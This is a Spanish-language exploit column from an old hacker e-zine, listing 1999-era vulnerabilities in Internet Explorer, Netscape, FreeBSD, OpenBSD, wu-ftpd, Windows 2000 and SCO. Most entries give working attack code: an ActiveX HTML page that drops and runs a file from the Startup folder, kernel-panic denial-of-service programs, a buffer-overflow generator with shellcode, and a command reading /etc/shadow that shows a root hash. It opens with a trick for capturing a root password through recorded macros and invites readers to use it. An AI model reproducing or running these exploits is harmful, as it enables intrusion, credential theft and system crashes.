---- { R16_08 } --------------------------------------------------------------

-------- { Bugs y Exploits } -------------------------------------------------

--- { PaTa }

        Empezamos con un bug de propia cosecha mandado por un lector, haber si
el ejemplo cunde y os  animais a contribuir en esta seccion con los fallos que
descubrais.

        ­Animo!

-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: Host Explorer 4.0  <-> AIX 4.21
Objetivo:     Conseguir el password de r00t
Parche:       Desactivar scriptïs
Creditos:     The BroliWarrior "broliwarrior@angelfire.com"
              http://www.angelfire.com/wa/BroliWarrior
Descripcion:  Hay gente que necesita trabajar con derechos de root para
              utilizar con ciertos script's que tienen efecto solamente para
              este usuario. Tienes derechos pero no te dan la  password ya que
              se supone, solo vas a trabajar con esos ficheros. No puedes
              abrirte una sesion por tu cuenta y trastear con derechos de root
              ya que no tienes la clave.
              Bien, cuando en este programa, Host Explorer 4.0, haces telnet a
              la direccion deseada y generas una macro (menz Macro ->
              StarRecording) se van almacenando en un fichero todas las teclas
              pulsadas. Por supuesto, cuando corres una macro es como si un
              usuario estuviera en ese momento ante la maquina. Se abre una
              sesion y cuando vas a hacer login, se ejecuta la macro. 
              Pues tenemos una forma de ver la ansiada password que marca, la
              forma es la siguiente.
              Si, estas ejecutando un proceso el cual te deja la pantalla
              completamente en negro (salvo por una frase del  tipo "Espere un
              momento, por favor... ") entonces rapidamente ejecutas la macro
              en la que sabes que hace login el root, aunque haya otra en
              ejecucion.
              Veras en la pantalla en negro la pulsacion de todas las teclas,
              incluida el password.
              Jajaja, interesante, verdad?. Aprovechad.

-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-


-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: Internet Explorer 5.0
Objetivo:     Un fallo en ActiveX permite ejecutar programas.
Parche:       Cambiar la seguridad a Alta, desactivar los Scripts Activos,
              desactivar los controles ActiveX
Creditos:     Georgi Guninski "joro@nat.bg"
              http://www.nat.bg/~joro/scrtlb.html
Descripcion:  Internet Explorer 5.0 bajo Windows 95/98 y Windows NT permite
              ejecutar programas en la maquina local creando y sobreescri-
              biendo ficheros locales y poniendo contenido en ellos.
              El problema se encuentra en un COntro ActiveX "Object for
              constructing type libraries for scriptlets"
Codigo:
<++> R16/XPLOIT/Ie50.html
<object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC">
</object>
<SCRIPT>
scr.Reset();
scr.Path="C:\\windows\\Start Menu\\Programs\\StartUp\\guninski.hta";
scr.Doc="<object id='wsh'
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>
alert('Written by Georgi Guninski http://www.nat.bg/~joro');wsh.Run
('c:\\command.com');</"+"SCRIPT>";
scr.write();
</SCRIPT>
</object>
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: FreeBSD 3.2
Objetivo:     Kernel Panic 
Parche:       Update Kernel
Creditos:     Sebastien Petit "spe@oleane.net"
Descripcion:  Es un problema con FreeBSD 3.2-RELEASE y -STABLE y otras
              versiones de FreeBSD 3.x
              El Kernel Panic ocurre cuando un programa hace multiples
              accesos en un particion NFS v3 montada en los directorios por
              defecto (ej: mount x.x.x.x:/nfs /usr2).  FreeBSD 3.2 peta
              inmediatamente sin mensajes de error solamente "panic:
              getnewbuf: cannot get buffer, infinite recursion failure"
              con privilegios de root.  Se puede reproducir con un programa
              que cree multiples procesos (ej: 120) accediendo a la particion
              NFS montada en el directorio y usando funciones "open", "seek",
              "write", "close". NetBSD no es vulnerable.
Codigo:
<++> R16/XPLOIT/Fbsd.c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <sys/time.h>
#include <time.h>
void usr1() {
}
int main(int argc, char ** argv) {
  int nbfils;
  int nbopen;
  int tbloc;
  int tfichier;
  char filename[512];
  int i, j, k, f;
  int pid;
  struct timeval start;
  struct timeval end;
  float delay;
  void * bloc;
  if (argc<6) {
    fprintf(stderr, "Syntax: %s rep_nfs/ nb_child nb_open 
sizefile(Kb) blocksize(kb).\n", argv[0]);
    fprintf(stderr, "ie: %s /TEST/ 120 200 20000 100\n");
    exit(EXIT_FAILURE);
  }
  nbfils = atoi(argv[2]);
  nbopen = atoi(argv[3]);
  tfichier = atoi(argv[4]);
  tbloc = atoi(argv[5]);
  bloc = malloc(tbloc * 1024);
  memset(bloc, 0, tbloc * 1024);
  if (!bloc) {
    fprintf(stderr, "%s: ", argv[0]);
    perror("malloc");
    exit(-1);
  }
  fprintf(stderr, "forking %d times...\n", nbfils);
  signal(SIGUSR1, &usr1);
  j = 0;
  for(i=0;i<nbfils;i++) {
    pid = fork();
    if (pid<0) {
      perror("fork");
      break;
    } else
      j++;
    if (!pid) break;
  }
  if (!pid) {
    pause();
    pid = getpid();
    srand(pid*10);
    fprintf(stderr, "[%d] child %d: Here I go!\n", pid, i);
    sprintf(filename, "%s%d", argv[1], pid);
    for(i=0;i<nbopen;i++) {
      f = open(filename, O_CREAT|O_RDWR, 0666);
      if (f<0) {
	fprintf(stderr, "[%d] file %s ", pid, filename);
	perror("open");
	break;
      }
      k = (rand() % (tfichier * 1024));
      j = lseek(f, k, SEEK_SET);
      if (j!=k) {
	fprintf(stderr, "[%d] ", pid);
	perror("lseek");
	break;
      }
      // read(f, bloc, tbloc*1024);
      if (write(f, bloc, tbloc*1024)!=tbloc*1024) {
	fprintf(stderr, "[%d] ", pid);
	perror("write");
	break;
      }
      sync();
      if (close(f)) {
	fprintf(stderr, "[%d] ", pid);
	perror("close");
	break;
      }
    }
    exit(0);
  }
  sleep(2);
  gettimeofday(&start, NULL);
  kill(0, SIGUSR1);
  i = 0;
  while (i<nbfils)
    if (waitpid(-1, NULL, 0)>0)
      i++;
  fprintf(stderr, "they're all dead now, exiting.\nYour system is not 
vulnerable\n");
  gettimeofday(&end, NULL);
  delay = end.tv_sec - start.tv_sec + ((float) (end.tv_usec - 
start.tv_usec))
    / (float) 1000000;
  i = nbopen * tbloc * nbfils;
  exit(0);
}
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: FreeBSD 3.2 RELEASE
              OpenBSD 2.4 GENERIC kernel
              OpenBSD 2.5 
Objetivo:     Local Denial of Service.
Parche:       Update
Creditos:     Sven Berkvens "sven@ilse.nl"
Descripcion:  Un usuario sin privilegios puede causar un kernel panic,
              causando un reseteo del sistema.
Codigo:
<++> R16/XPLOIT/Bsddos.c
#include <unistd.h>
#include <sys/socket.h>
#include <fcntl.h>
#define BUFFERSIZE 204800
extern int
main(void)
{
int p[2], i;
char crap[BUFFERSIZE];
while (1)
{
if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == -1)
break;
i = BUFFERSIZE;
setsockopt(p[0], SOL_SOCKET, SO_RCVBUF, &i, sizeof(int));
setsockopt(p[0], SOL_SOCKET, SO_SNDBUF, &i, sizeof(int));
setsockopt(p[1], SOL_SOCKET, SO_RCVBUF, &i, sizeof(int));
setsockopt(p[1], SOL_SOCKET, SO_SNDBUF, &i, sizeof(int));
fcntl(p[0], F_SETFL, O_NONBLOCK);
fcntl(p[1], F_SETFL, O_NONBLOCK);
write(p[0], crap, BUFFERSIZE);
write(p[1], crap, BUFFERSIZE);
}
exit(0);
}
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: Netscape Communicator 4.06, 4.5,4.6 and 4.61e
Objetivo:     Buffer Overflow
Parche:       Actualizar msvcrt.dll la version actual es 6.00.8397
Creditos:     "defcon0@ugtop.com" DEF CON ZERO WINDOW              
http://www.ugtop.com/defcon0/hc/nc4x_ex/nc4x_ex.cgi
http://www.ugtop.com/defcon0/hc/nc4x_ex/nc4x_ex2.cgi
Descripcion:  Algunas versiones del Netscape Communicator son vulnerables a
              un buffer overflow cuando se utiliza se utiliza la opcion 
              EMBED tag.  Este buffer overflow puede usarse para ejecutar
              codigo arbitrario.
Codigo:
<++> R16/XPLOIT/Netscape.c
/************************************************************************/
/*  Netscape communicator 4.06J - 4.6J, 4.61e Exploit for  Windows98    */
/*                                                                      */
/*                              written by R00t Zer0(defcon0@ugtop.com) */
/*                                                                      */
/*                DEF CON ZERO( http://www.ugtop.com/defcon0/index.htm) */
/************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#define	STACK_LEN		( 2135 )
#define	EMBED_TYPE_LEN	( 150 )
#define	XPT_HDL_OFFSET	( 588 )
#define	JMPS_OFFSET		( 6 )
#define	JMP_EBX_ADDR	( 0xbff7a06b )
#define	INT01H_ADDR		( 0xbff73d30 )
#define	NOP_CODE		( 0x90 )
#define	JMPS_CODE		( 0xeb )
#define	FUNCTION		"msvcrt.dll.system.exit."
#define	COMMAND			"welcome.exe"
#define	CMDLENP			( 65 )
int
main( void )
	{
	u_char win98_exec_code[100] = {
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,
0xF7,0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,0x52,0x32,0xE4,0x83,0xC3,0x06,
0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x5A,0x43,0x53,0x52,
0x32,0xE4,0x83,0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
0xF8,0x43,0x53,0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,0x33,0xC0,0x50,
0xFF,0xD7,0xE8,0xB0,0xFF,0xFF,0xFF,0x00 };
	u_char	exploit_code[ STACK_LEN ];
	u_char	embed_type[ EMBED_TYPE_LEN ];
	u_long	ip;
	int		loop;
	srand( ( u_int )time( 0 ) );
	bzero( exploit_code, sizeof( exploit_code ) );
        for( loop = 0; loop < XPT_HDL_OFFSET; loop++ )
		exploit_code [loop ] = NOP_CODE;
	/* make exploit code */
	ip = JMP_EBX_ADDR;
	exploit_code[ XPT_HDL_OFFSET - 4 ] = JMPS_CODE;
	exploit_code[ XPT_HDL_OFFSET - 3 ] = JMPS_OFFSET;
	exploit_code[ XPT_HDL_OFFSET + 3 ] = ( char)( 0xff & ( ip >> 24 ) );
	exploit_code[ XPT_HDL_OFFSET + 2 ] = ( char)( 0xff & ( ip >> 16 ) );
	exploit_code[ XPT_HDL_OFFSET + 1 ] = ( char)( 0xff & ( ip >> 8  ) );
	exploit_code[ XPT_HDL_OFFSET + 0 ] = ( char)( 0xff & ( ip >> 0  ) );
        win98_exec_code[ CMDLENP ] = strlen( COMMAND );
	strcat( exploit_code, win98_exec_code );
	strcat( exploit_code, FUNCTION );
	strcat( exploit_code, COMMAND );
	/* set random type */
        for( loop = 0; loop < EMBED_TYPE_LEN; loop++ )
		embed_type[ loop ] = 0x23 + ( rand() % 93 );
	/* print html */
	printf( "Content-type: text/html\n\n" );
        printf( "<HTML>\n" );
        printf( "<HEAD>\n" );
        printf( "       <TITLE>Netscape communicator 4.x 
Exploit!!</TITLE>\n" );
        printf( "</HEAD>\n" );
        printf( "<BODY>\n" );
        printf( "<EMBED SRC=\"FreeUNYUN!\" PLUGINSPAGE=\"%s\" ", 
exploit_code );
	printf( "TYPE=\"%s\" WIDTH=\"1500\" HEIGHT=\"1000\">\n", embed_type  
);
        printf( "</EMBED>\n</BODY>\n</HTML>\n" );
	return( 0 );
	}
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: Internet Explorer 5.0
Objetivo:     Un simple HTML puede usarse para colgar el Internet Explorer
Parche:       Service Park, cuando lo saquen.
Creditos:     "neonbunny@bunnybox.net" Neon Bunny
www.securiteam.com/windowsntfocus/neonbunnycrashtest.html
Descripcion:  Cuelgue del Internet Explorer, se puede decir mas alto pero
              no mas claro, que no solo el Netscape tiene fallos, porras!
              Testeado bajo Windows 98 y Windows 2000
Codigo:
<++> R16/XPLOIT/Ie50Dos.html
<html>
<head>
<title>NeonBunny's IE5 Crasher</title>
</head>
<body>
<form method="POST">
<table>
<tr>
<td width="20%"><input type="text" name="State" size="99999999"
maxlength="99999999" value=""></td>
</tr>
</table>
</form>
</body>
</html>
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: wu-ftpd 2.5, VR and BeroFTPD
Objetivo:     Root remoto
Parche:       Tienes el codigo abajo
Creditos:     "lcamtuf@ids.pl" Michal Zalewski
Descripcion:  Un buffer overflow en wu-ftpd 2.5 en mapped_path.
Codigo del parche:
<++> R16/XPLOIT/ftpd.c
*** ftpd.c	Sun Jun  6 15:20:21 1999
--- ftpd_patched.c	Sun Jun  6 15:15:03 1999
***************
*** 1245,1251 ****
        /* append the dir part with a leading / unless at root */
        if( !(mapped_path[0] == '/' && mapped_path[1] == '\0') )
                strcat( mapped_path, "/" );
!       strcat( mapped_path, dir );
  }
  int
--- 1245,1254 ----
        /* append the dir part with a leading / unless at root */
        if( !(mapped_path[0] == '/' && mapped_path[1] == '\0') )
                strcat( mapped_path, "/" );
!       if ( strlen(mapped_path) + strlen (dir) < 4095 )
!               strcat( mapped_path, dir );
!       else 
!         syslog(LOG_ERR, "FTP mapped_path attack ");
  }
  int
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: Windows 2000 COM
Objetivo:     Ataque al servicio Telnet.
Parche:       Windows 2000 estable?
Creditos:     "mnemonix@globalnet.co.uk" Mnemonix
Descripcion:  La version beta de Windows 2000 tiene un servidor telnet, que no
              esta instalado por defecto.  Este servidor puede ser iniciali-
              zado por defecto, se puede lograr introduciendo codigo HTML en
              una pagina web o en cliente de correo Outlook.
Codigo:
<++> R16/XPLOIT/w2000.html
<SCRIPT LANGUAGE=VBScript>
CreateObject("TlntSvr.EnumTelnetClientsSvr")
</SCRIPT>
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-

S.O/Programa: SCO 5.0.5 2.0.0e2
Objetivo:     Todos los usuarios pueden leer el /etc/shadow
Parche:       Desactivar el setuid root de la aplicacion.
Creditos:     "btellier@webley.com" Brock Tellier
Descripcion:  En SCO 5.0.5's /bin/doctor 2.0.0e2 un simple script puede leer
              cualquier fichero del sistema.
Codigo:
<++> R16/XPLOIT/sco.scp
scobox:/bin$ <b>id</b>
uid=136(btellier),200(users)
scobox:/bin$ <b>uname -a</b>
SCO_SV scobox 3.2 5.0.5 i386
scobox:/bin$ <b>doctor -V</b>
doctor 2.0.0e 2
scobox:/bin$ <b>doctor -s /etc/shadow</b>
doctor: WARNING User message: invalid command name 
"root:xbfOLR0ekXN/o:10656::"
<-->
-*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*-
